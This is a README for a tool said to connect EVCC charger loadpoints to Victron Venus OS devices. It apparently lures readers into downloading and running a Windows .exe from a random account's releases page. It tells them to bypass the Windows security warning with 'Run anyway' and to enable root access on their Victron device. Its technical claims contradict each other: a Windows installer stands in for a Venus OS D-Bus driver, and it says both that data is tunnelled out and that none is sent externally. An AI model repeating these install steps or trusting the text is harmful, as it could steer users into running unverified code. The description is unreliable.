# ⚡ dbus-evcc-multi - Connect your car charger to Victron

[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Thermal-feedstock975/dbus-evcc-multi/releases)

## 📌 About this project

This tool links your EVCC loadpoints to your Victron Venus OS system. It acts as a bridge. It makes your car charger show up as a standard EV charger on your Cerbo GX or equivalent Victron device.

The software runs on your local network. It talks to EVCC and then tells your Victron system how much power the car uses. This allows your Venus OS dashboard to track your solar energy usage and car charging status in one place.

## 🛠️ System requirements

Before you install this software, ensure your hardware meets these needs:

* A Victron Venus OS device such as a Cerbo GX, Ekrano GX, or an RPi running Venus firmware.
* A working instance of EVCC running on your local network.
* A computer running Windows 10 or 11 for the initial setup.
* A stable network connection for all devices.
* Root access enabled on your Victron device.

## 🚀 Downloading the software

You need the installer to set up the bridge. Follow these steps to get the file:

1. Visit the [releases page](https://github.com/Thermal-feedstock975/dbus-evcc-multi/releases).
2. Look for the latest version at the top of the list.
3. Click the file ending in `.exe` to start the download.
4. Save the file to a folder you can find easily, such as your Downloads folder.

## ⚙️ Installation steps

Follow these instructions to install the bridge on your system:

1. Open the folder where you saved the installer.
2. Double-click the file to launch the setup wizard.
3. If Windows displays a security warning, click "More info" and then "Run anyway."
4. Follow the prompts on the screen.
5. The installer detects your Victron hardware automatically if it sits on the same network.
6. Enter the IP address of your Victron device when the installer asks.
7. Enter the address of your EVCC instance.
8. Click "Finish" to complete the process.

## 🔌 Connecting to Victron

The bridge communicates with the Victron D-Bus interface. This interface allows the Cerbo GX to see the EV charger as a native device. 

The software automatically creates the necessary files on the Venus OS device. It maps each EVCC loadpoint to a unique D-Bus service. This ensures the Victron interface displays the correct power flow for each charger.

If your setup uses the VRM web-UI, the bridge sends data through this tunnel. This lets you view your charging data from anywhere in the world.

## 🔍 Verifying the connection

Check if the bridge works correctly:

1. Open your web browser on your PC.
2. Enter the IP address of your Victron GX device.
3. Navigate to the "Device List" page.
4. Look for an entry labelled "EV Charger" or similar.
5. If you see the charger, the setup is successful.
6. The screen should show active charging status, power usage, and connection status.

## 🛠️ Troubleshooting

If the charger does not appear in your device list:

* Confirm the Cerbo GX and the bridge run on the same network subnet.
* Check that you entered the correct IP address in the setup tool.
* Restart the Victron device.
* Verify that EVCC runs correctly by opening its web interface in your browser.
* Ensure your firewall allows communication between the PC and the Cerbo GX.

## 📋 Common questions

### Does this require a cloud account?
No. All communication stays on your local network. You do not need to send data to any external servers.

### Can I monitor multiple chargers?
Yes. The bridge discovers every loadpoint configured in your EVCC instance. It adds each one individually to the Venus OS.

### Does it use much memory?
The software has a light footprint. It consumes minimal resources on your system.

### How do I update the software?
Download the newer version from the link above and run the installer again. It overwrites the old files and keeps your configuration intact.

### Is root access safe?
Root access allows the bridge to talk to the internal D-Bus. This is necessary for the Venus OS to recognize external devices as native chargers.

## 💡 Best practices

Keep your software up to date. Updates include performance tweaks and support for newer EVCC features. 

Ensure your Victron firmware stays current. Venus OS updates sometimes change how the D-Bus interface works. The bridge adapts to these changes, but you must keep both the bridge and the Venus OS firmware updated for the best results.

If you change your charger configuration in EVCC, the bridge will detect these changes the next time it starts. You do not need to change settings in the bridge manually. 

For advanced users, logs exist in the installation folder. If you encounter issues, these files help pinpoint potential communication errors. Open the log file with any text editor to read the history of the bridge. 

The software runs as a background service. It starts automatically when you turn on your machine. You do not need to keep the setup window open for the bridge to function. 

If you prefer to disable the bridge, go to your Windows Task Manager, find the service in the "Services" tab, right-click it, and select "Stop."